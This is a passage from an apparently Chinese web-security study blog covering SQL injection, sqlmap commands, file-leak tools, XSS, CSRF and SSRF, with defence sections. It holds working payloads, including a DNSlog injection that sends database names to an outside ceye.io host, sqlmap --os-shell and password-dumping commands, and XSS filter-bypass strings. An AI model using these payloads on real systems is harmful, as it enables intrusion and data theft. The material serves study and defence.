class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;\\\\afanti.xxxx.ceye.io\\aaa&apos;);</span><br></pre></td></tr></table></figure><p>注意：load_file函数在Linux下是无法用来做dnslog攻击的，因为在这里就涉及到Windows的一个小Tips——UNC路径。</p><p>以下是百度的UNC路径的解释</p><p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\sss.xxx\test\</span><br></pre></td></tr></table></figure><p>这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p><p>以sql-labs第五关：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)-- -+</span><br></pre></td></tr></table></figure><h6 id="六-宽字节注入"><a href="#六-宽字节注入" class="headerlink" title="六:宽字节注入"></a>六:宽字节注入</h6><p>在使用PHP连接MySQL的时候，当设置“set<br>character_set_client = gbk”时会导致一个编码转换的问题，也就是我们熟悉的宽字节注入，当存在宽字节注入的时候，注入参数里带入％ DF％27，即可把（％5C）吃掉，举个例子。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.com/index.php?id=1</span><br></pre></td></tr></table></figure><p>当提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and 1=1%23</span><br></pre></td></tr></table></figure><p>时，MySQL的运行的SQL语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where  id =&apos;1\&apos; and 1=1#&apos;</span><br></pre></td></tr></table></figure><p>很明显这是没有注入成功的，而当我们提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%df&apos; and 1=1%231</span><br></pre></td></tr></table></figure><p>MySQL的运行的SQL语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id =&apos;1運&apos; and 1=1#&apos;1</span><br></pre></td></tr></table></figure><blockquote><p>我们这里的宽字节注入是利用的MySQL的一个特性，MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以％DF和后面的\也就是％5c中变成了一个汉字“运”，而单引号逃逸了出来。</p></blockquote><h6 id="七-sql正则注入"><a href="#七-sql正则注入" class="headerlink" title="七:sql正则注入"></a>七:sql正则注入</h6><p> 通俗点就是常用的筛选语句被过滤的时候使用like 或regexp进行匹配，regexp支持正则表达式匹配 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如$query=&quot;select user from user where user=&apos;$_POST[username]&apos; and passwd=&apos;$_POST[passwd]&apos;&quot;;  </span><br><span class="line"></span><br><span class="line">payload username=\&amp;passwd=||passwd/**/REGEXP/**/&quot;^d&quot;;%00</span><br></pre></td></tr></table></figure><h4 id="sqlmap工具使用"><a href="#sqlmap工具使用" class="headerlink" title="sqlmap工具使用"></a>sqlmap工具使用</h4><blockquote><p><a href="https://xz.aliyun.com/t/3010" target="_blank" rel="noopener">https://xz.aliyun.com/t/3010</a></p><p><a href="https://xz.aliyun.com/t/3011" target="_blank" rel="noopener">https://xz.aliyun.com/t/3011</a></p></blockquote><blockquote><p>SQLmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Acess，IBM DB2，SQLLite，Firebird，Sybase和SAP MaxDB……SQLmap采用几种独特的SQL注入技术，分别是盲推理SQL注入，UNION查询SQL注入，对查询和盲注。其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令。</p></blockquote><p>当给Sqlmap一个url跑的时候，它会：</p><p>1.判断注入时选择的参数</p><p>2.判断识别出使用的那种数据库</p><p>3.判断注入时使用何种sql注入技术来进行注入</p><p>4.根据用户的选择需要，获取相应的需要的数据</p><h5 id="sqlmap常用参数"><a href="#sqlmap常用参数" class="headerlink" title="sqlmap常用参数"></a>sqlmap常用参数</h5><blockquote><p>-u : 指定目标URL，sql注入点<br>–cookie : 当前会话的cookie值<br>–level: 探测等级  http cookie在2级时可以检测   HTTP user-Agent/Referer在3级时就会检测<br>-r:sqlmap可以从一个文本文件中获取<code>HTTP</code>请求，这样就可以跳过设置一些其他参数<br>–tamper: sqlmap的绕过脚本  可以使用–identify-waf对一些网站是否有安全防护进行试探 </p></blockquote><h5 id="sqlmap各种注入点方法"><a href="#sqlmap各种注入点方法" class="headerlink" title="sqlmap各种注入点方法"></a>sqlmap各种注入点方法</h5><h6 id="get注入点方法"><a href="#get注入点方法" class="headerlink" title="get注入点方法"></a>get注入点方法</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; //这个URL必须含？</span><br></pre></td></tr></table></figure><h6 id="post注入点方法"><a href="#post注入点方法" class="headerlink" title="post注入点方法"></a>post注入点方法</h6><blockquote><p>抓包，放到txt文件，使用sqlmap -r *.txt实现post注入</p><p>使用文件时，制定某特定选项注入的方法,在文件中，将指定的参数值设为星号（*）</p><p>或者</p><p>sqlmap -u “url” –data “xxx=xxx&amp;xxx=xxx”</p></blockquote><h6 id="cookie注入点方法"><a href="#cookie注入点方法" class="headerlink" title="cookie注入点方法"></a>cookie注入点方法</h6><blockquote><p>sqlmap -u “url” –cookie “xxx” –level 2 //这里的URL去掉？及其后的内容，并将它们放在cookie的内容里面</p></blockquote><h5 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --dbs   //查看所有数据库</span><br><span class="line">sqlmap -u &quot;url&quot; --users //查看所有用户</span><br><span class="line">sqlmap -u &quot;url&quot; --current-db //查看当前的数据库</span><br><span class="line">sqlmap -u &quot;url&quot; --current-user //产看当前的用户</span><br><span class="line">sqlmap -u &quot;url&quot; --is-dba //查看是否是最高权限</span><br><span class="line">sqlmap -u &quot;url&quot; --passwords //查看所有密码</span><br><span class="line">sqlmap -u &quot;url&quot; –hostname //查看主机名</span><br><span class="line">sqlmap -u &quot;url&quot; privileges -U username //查看用户权限</span><br><span class="line">sqlmap -u &quot;url&quot; –roles //查看用户角色</span><br></pre></td></tr></table></figure><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --os-cmd &quot;cmd&quot;  //执行cmd代表的命令，如cd C:/</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;url&quot; --os-shell  //进入数据库自带的shell</span><br></pre></td></tr></table></figure><h5 id="从文本中获取多个目标扫描"><a href="#从文本中获取多个目标扫描" class="headerlink" title="从文本中获取多个目标扫描"></a>从文本中获取多个目标扫描</h5><p>参数：<code>-m</code></p><p>文件中保存<code>url</code>格式如下，<code>sqlmap</code>会一个一个检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www.target1.com/vuln1.php?q=foobar</span><br><span class="line"></span><br><span class="line">www.target2.com/vuln2.asp?id=1</span><br><span class="line"></span><br><span class="line">www.target3.com/vuln3/id/1*</span><br></pre></td></tr></table></figure><h5 id="从文件中加载HTTP请求"><a href="#从文件中加载HTTP请求" class="headerlink" title="从文件中加载HTTP请求"></a>从文件中加载HTTP请求</h5><p>参数：<code>-r</code></p><p><code>sqlmap</code>可以从一个文本文件中获取<code>HTTP</code>请求，这样就可以跳过设置一些其他参数（比如<code>cookie，POST</code>数据，等等）。</p><p>比如文本文件内如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /vuln.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: www.target.com</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/4.0</span><br><span class="line"></span><br><span class="line">id=1</span><br></pre></td></tr></table></figure><p>当请求是HTTPS的时候你需要配合这个<code>–force-ssl</code>参数来使用，或者你可以在Host头后面加上:<code>44</code></p><h5 id="爬行网站URL"><a href="#爬行网站URL" class="headerlink" title="爬行网站URL"></a>爬行网站URL</h5><p>参数：<code>–crawl</code></p><p><code>sqlmap</code>可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/&quot; --batch --crawl=3</span><br><span class="line">[...]</span><br><span class="line">[xx:xx:53] [INFO] starting crawler</span><br><span class="line">[xx:xx:53] [INFO] searching for links with depth 1</span><br><span class="line">[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while</span><br><span class="line">[xx:xx:53] [INFO] searching for links with depth 2</span><br><span class="line">[xx:xx:54] [INFO] heuristics detected web page charset &apos;ascii&apos;</span><br><span class="line">[xx:xx:00] [INFO] 42/56 links visited (75%)</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h5 id="常用的tamper脚本"><a href="#常用的tamper脚本" class="headerlink" title="常用的tamper脚本"></a>常用的tamper脚本</h5><blockquote><p><a href="https://xz.aliyun.com/t/2746" target="_blank" rel="noopener">https://xz.aliyun.com/t/2746</a></p></blockquote><h5 id="sqlmap-–os-shell"><a href="#sqlmap-–os-shell" class="headerlink" title="sqlmap –os-shell"></a>sqlmap –os-shell</h5><h6 id="注入sqlmap马"><a href="#注入sqlmap马" class="headerlink" title="注入sqlmap马"></a>注入sqlmap马</h6><blockquote><p><a href="https://xz.aliyun.com/t/7942#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/7942#toc-1</a></p></blockquote><p>必要条件：</p><ul><li>知道网站绝对路径</li><li>拥有网站的写入权限</li><li>Secure_file_priv参数为空或者为指定路径。</li></ul><p>普通注入–os-shell主要是通过上传一个sqlmap的马，然后通过马来进行命令执行。</p><h4 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h4><h5 id="过滤符号"><a href="#过滤符号" class="headerlink" title="过滤符号"></a>过滤符号</h5><h6 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h6><blockquote><p>/**/</p><p>+</p></blockquote><h6 id="过滤"><a href="#过滤" class="headerlink" title="过滤 # -"></a>过滤 <em># -</em></h6><blockquote><p>;%00</p></blockquote><h6 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤="></a>过滤=</h6><blockquote><p>like</p></blockquote><h5 id="过滤字符串"><a href="#过滤字符串" class="headerlink" title="过滤字符串"></a>过滤字符串</h5><h4 id="sql注入防御措施"><a href="#sql注入防御措施" class="headerlink" title="sql注入防御措施"></a>sql注入防御措施</h4><h5 id="1-PreparedStatement（简单而有效的方法）"><a href="#1-PreparedStatement（简单而有效的方法）" class="headerlink" title="1.PreparedStatement（简单而有效的方法）"></a>1.PreparedStatement（简单而有效的方法）</h5><blockquote><p>原理：SQL注入只对SQL语句的准备(编译)过程有破坏作用</p><p>而PreparedStatement已经准备好了,执行阶段只是把输入串作为数据处理,</p><p>而不再对SQL语句进行解析,准备,因此也就避免了SQL注入问题.</p></blockquote><h5 id="2-字符串过滤"><a href="#2-字符串过滤" class="headerlink" title="2.字符串过滤"></a>2.字符串过滤</h5><blockquote><p>过滤sql注入中关键字符串</p></blockquote><h5 id="3-普通用户与系统管理员用户的权限要有严格的区分。"><a href="#3-普通用户与系统管理员用户的权限要有严格的区分。" class="headerlink" title="3.普通用户与系统管理员用户的权限要有严格的区分。"></a>3.普通用户与系统管理员用户的权限要有严格的区分。</h5><blockquote><p>应用程序在设计的时候，最好把系统管理员的用户与普通用户区分开来。如此可以最大限度的减少注入式攻击对数据库带来的危害。 </p></blockquote><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a></p><h3 id="敏感信息泄漏"><a href="#敏感信息泄漏" class="headerlink" title="敏感信息泄漏"></a>敏感信息泄漏</h3><p>敏感信息泄漏，是指人们把不该公开的信息，给放入到公开的信息库中。造成敏感信息泄露。</p><p>如</p><blockquote><p>phpinfo()信息泄漏<br>测试页面泄漏在外网<br>版本管理工具(如git)文件信息泄漏<br>管理后台地址泄漏泄漏<br>员工邮箱、分机号码<br>错误页面暴漏信息<br>探针文件<br>robots.txt<br>phpMyAdmin<br>网站源码备份文件(<a href="http://www.rar/sitename.tar.gz/web/zip等" target="_blank" rel="noopener">www.rar/sitename.tar.gz/web/zip等</a>)</p></blockquote><blockquote><p>御剑扫描后台</p><p>dirsearch扫描  <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p></blockquote><h4 id="各种备份文件泄露"><a href="#各种备份文件泄露" class="headerlink" title="各种备份文件泄露"></a>各种备份文件泄露</h4><h5 id="1-Git文件泄露"><a href="#1-Git文件泄露" class="headerlink" title="1 Git文件泄露"></a>1 Git文件泄露</h5><p><strong>漏洞成因：</strong></p><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g. http://www.example.com/.git/config</span><br></pre></td></tr></table></figure><p><strong>漏洞利用:</strong></p><p>工具：</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http://www.example.com/.git/</span><br></pre></td></tr></table></figure><h5 id="2-DS-Store文件泄漏"><a href="#2-DS-Store文件泄漏" class="headerlink" title="2 .DS_Store文件泄漏"></a>2 .DS_Store文件泄漏</h5><p><strong>漏洞成因:</strong></p><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p><p><strong>漏洞利用:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/.ds_store</span><br></pre></td></tr></table></figure><p>注意路径检查</p><p>工具：</p><p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">dsstoreexp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://www.example.com/.DS_Store</span><br></pre></td></tr></table></figure><h5 id="3-网站备份压缩文件"><a href="#3-网站备份压缩文件" class="headerlink" title="3 网站备份压缩文件"></a>3 网站备份压缩文件</h5><p>当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p><p><strong>漏洞成因及危害:</strong></p><p>该漏洞的成因主要有以下两种：</p><ol><li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li><li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li></ol><p><strong>漏洞检测:</strong></p><p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.swp</span><br><span class="line">.txt</span><br></pre></td></tr></table></figure><h5 id="4-SVN导致文件泄露"><a href="#4-SVN导致文件泄露" class="headerlink" title="4 SVN导致文件泄露"></a>4 SVN导致文件泄露</h5><p> Subversion，简称SVN，是一个开放源代码的版本控制系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g.http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries</span><br></pre></td></tr></table></figure><p><strong>漏洞利用:</strong></p><p>工具：</p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-svn.pl -v -u http://www.example.com/.svn/</span><br></pre></td></tr></table></figure><h3 id="xss跨站脚本漏洞"><a href="#xss跨站脚本漏洞" class="headerlink" title="xss跨站脚本漏洞"></a>xss跨站脚本漏洞</h3><blockquote><p>跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 </p></blockquote><h4 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h4><p>URL编码：一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为%2F</p><p>HTML实体编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命名实体：以&amp;开头，分号结尾的，例如“&lt;”的编码是“&amp;lt;”</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符编码：十进制、十六进制ASCII码或unicode字符编码，样式为“&amp;#数值;”,例如“&lt;”可以编码为“&amp;#060;”和“&amp;#x3c;”</span><br></pre></td></tr></table></figure><h4 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h4><h5 id="非持久型xss攻击："><a href="#非持久型xss攻击：" class="headerlink" title="非持久型xss攻击："></a>非持久型xss攻击：</h5><p>顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</p><h5 id="持久型xss攻击："><a href="#持久型xss攻击：" class="headerlink" title="持久型xss攻击："></a>持久型xss攻击：</h5><p>持久型xss，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。</p><p>xss也可以分成三类：</p><h5 id="反射型："><a href="#反射型：" class="headerlink" title="反射型："></a>反射型：</h5><p>经过后端，不经过数据库</p><h5 id="存储型："><a href="#存储型：" class="headerlink" title="存储型："></a>存储型：</h5><p>经过后端，经过数据库</p><h5 id="DOM型："><a href="#DOM型：" class="headerlink" title="DOM型："></a>DOM型：</h5><p>不经过后端，DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞，dom - xss是通过url传入参数去控制触发的 </p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>通过 XSS 来获得用户 Cookie 或其他有用信息，利用平台负责接收并保存这些信息。XSS利用平台有很多种如XSS Shell, BeEF, Anehta, CAL9000。</p><h4 id="具体标签的Payload"><a href="#具体标签的Payload" class="headerlink" title="具体标签的Payload"></a>具体标签的Payload</h4><blockquote><p><a href="http://momomoxiaoxi.com/2017/10/10/XSS/" target="_blank" rel="noopener">http://momomoxiaoxi.com/2017/10/10/XSS/</a></p></blockquote><h5 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h5><ul><li><p>javascript伪协议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(2)&gt;</span><br></pre></td></tr></table></figure></li><li><p>data协议执行javascript：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg</span>==&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h5><p>最简单的测试payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(/3/)&lt;/script&gt;//可以用&quot;/&quot;来代替单引号和双引号</span><br></pre></td></tr></table></figure><h5 id="button标签"><a href="#button标签" class="headerlink" title="button标签"></a>button标签</h5><p>event事件实现js调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button/onclick=alert(1) &gt;M&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>需要交互的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;M</span><br></pre></td></tr></table></figure><p>不需要交互的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onfocus=alert(1) autofocus&gt;</span><br></pre></td></tr></table></figure><h5 id="p标签"><a href="#p标签" class="headerlink" title="p标签"></a>p标签</h5><ul><li><p>如果发现变量输出在p标签中，只要能跳出””</p><p>就足够了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p/onmouseover=javascript:alert(1); &gt;M&lt;/p&gt;</span><br></pre></td></tr></table></figure></li></ul><h5 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(1)&gt; </span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x:kcf&quot; onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><h5 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h5><p>通过event事件来调用js</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="过waf"><a href="#过waf" class="headerlink" title="过waf"></a>过waf</h4><blockquote><p>大小写绕过</p><p> 双重复写绕过 </p><p> alert被过滤，可以尝试prompt和confirm </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没有引号和分号：&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格被过滤：&lt;img/src=&quot;&quot;onerror=alert(2)&gt; &lt;svg/onload=alert(2)&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>javascript伪协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(/test/)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;);height=0 width=0 /&gt;&lt;iframe&gt;利用iframe框架标签</span><br></pre></td></tr></table></figure></blockquote><h4 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h4><p><a href="https://github.com/rajeshmajumdar/BruteXSS" target="_blank" rel="noopener">https://github.com/rajeshmajumdar/BruteXSS</a></p><h4 id="xss防御"><a href="#xss防御" class="headerlink" title="xss防御"></a>xss防御</h4><p>1 采用过滤函数</p><blockquote><p>php中</p><p>1.htmlspecialchars函数<br>2.htmlentities函数             把字符转换为 HTML 实体。<br>3.HTMLPurifier.auto.php插件<br>4.RemoveXss函数</p></blockquote><p>2 在设置Cookie时，加上HttpOnly参数</p><p>可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6</p><h3 id="csrf跨站请求伪造漏洞"><a href="#csrf跨站请求伪造漏洞" class="headerlink" title="csrf跨站请求伪造漏洞"></a>csrf跨站请求伪造漏洞</h3><p>CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。 </p><h4 id="与XSS的区别"><a href="#与XSS的区别" class="headerlink" title="与XSS的区别"></a>与XSS的区别</h4><p>XSS：hack发现存在xss漏洞的网站—&gt;制造payload—&gt;将带有payload的网址发送给用户诱导点击—&gt;执行payload获取黑客获取到敏感信息—&gt;hack利用敏感信息进行操作数据修改</p><p>CSRF: hack发现存在CSRF漏洞的网站—&gt;制造payload—&gt;将带有payload的网址发送给用户诱导点击—&gt;用户浏览了存在CSRF漏洞网站的情况下同时点击hack制作的payload链接，执行payload并且修改数据</p><p>区别：XSS是由hack诱导用户点击之后获取敏感信息，hack自己通过敏感信息进行下一步工具</p><p>区别：CSRF由hack构造payload诱导用户点击，用户点击的过程中同时浏览了存在漏洞的网站，由用户发起hack所制作的payload请求，修改信息</p><h4 id="csrf防御"><a href="#csrf防御" class="headerlink" title="csrf防御"></a>csrf防御</h4><p>1.验证HTTP Referer字段</p><p>referer字段表明了请求来源，通过在服务器端添加对请求头字段的验证拒绝一切跨站请求，但是请求头可以绕过，XHR对象通过setRequestHeader方法可以伪造请求头</p><p>2.添加token验证</p><p>客户端令牌token通常作为一种身份标识，由服务器端生成的一串字符串，当第一次登录后，服务器生成一个token返回给客户端，以后客户端只需带上token来请求数据即可，无需再次带上用户名和密码。如果来自浏览器请求中的token值与服务器发送给用户的token不匹配，或者请求中token不存在，则拒绝该请求，使用token验证可以有效防止CSRF攻击，但增加了后端数据处理的工作量</p><p>3.验证码</p><p>发送请求前需要输入基于服务端判断的验证码，机制与token类似，验证码强制用户与web完成交互后才能实现正常请求，最简洁而有效的方法，但影响用户体验</p><p>4.设置cookie的same-site属性</p><p>在 HTTP 的响应头中，same-site 有两种值：strict或lax。当 设置为 strict 时，表示该服务器发送的 cookie 值不允许附带在第三方请求中；当设置为lax 时，表示如果请求类型为同步请求且请求方式为 GET，则允许此 cookie 作为请求头的附带信息。将 same-site 的值设为 strict 可破坏产生 CSRF 攻击的必要条件。</p><h3 id="SSRF-（Server-side-Request-Forge-服务端请求伪造"><a href="#SSRF-（Server-side-Request-Forge-服务端请求伪造" class="headerlink" title="SSRF （Server-side Request Forge, 服务端请求伪造)"></a>SSRF （Server-side Request Forge, 服务端请求伪造)</h3><p><a href="https://www.jianshu.com/p/90a34b08a416" target="_blank" rel="noopener">web安全之 – SSRF攻击</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11408583.html" target="_blank" rel="noopener">CTF SSRF(服务器端伪造请求)</a></p><p><a href="https://www.cnblogs.com/ophxc/p/12872815.html" target="_blank" rel="noopener">Redis利用，攻击内网（ssrf）)</a></p><blockquote><p>是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。 </p></blockquote><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><blockquote><ul><li>1、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息</li><li>2、攻击运行在内网或本地的应用程序（比如溢出）</li><li>3、对内网Web应用进行指纹识别，通过访问默认文件实现</li><li>4、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）</li><li>5、利用file协议读取文件</li></ul></blockquote><h4 id="常用的利用思路："><a href="#常用的利用思路：" class="headerlink" title="常用的利用思路："></a>常用的利用思路：</h4><p>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;Payload Result</p><p>1.内网探测: 内网主机信息收集</p><p>2.应用识别: 